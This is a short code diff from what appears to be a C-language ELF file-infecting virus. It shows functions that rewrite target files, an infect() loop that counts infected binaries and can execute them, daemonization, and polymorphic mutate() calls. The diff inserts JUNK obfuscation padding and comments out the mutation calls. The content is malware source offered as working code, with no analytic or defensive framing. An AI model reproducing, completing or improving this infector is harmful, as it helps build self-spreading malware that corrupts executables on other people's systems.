@@ -49,11 +49,16 @@ static int	patch_new_file(data_t *data, const char *filename) {
 
 	JUNK;
 
+
 	unlink(filename);
+
+	JUNK;
 
 	int fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
 	if (fd == -1)
 		return 1;
+
+	JUNK;
 
 	if (write(fd, data->file, data->size) == -1) {
 		close(fd);
@@ -315,7 +320,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 
 				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
-					mutate();
+					//mutate();
 
 #ifdef ENABLE_EXEC
 					execute_prog(new_path, bs_data->envp);
@@ -374,7 +379,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 	int start_offset = g_start_offset;
 
 	prepare_mutate();
-	mutate();
+	//mutate();
 
 	daemonize(envp);
 
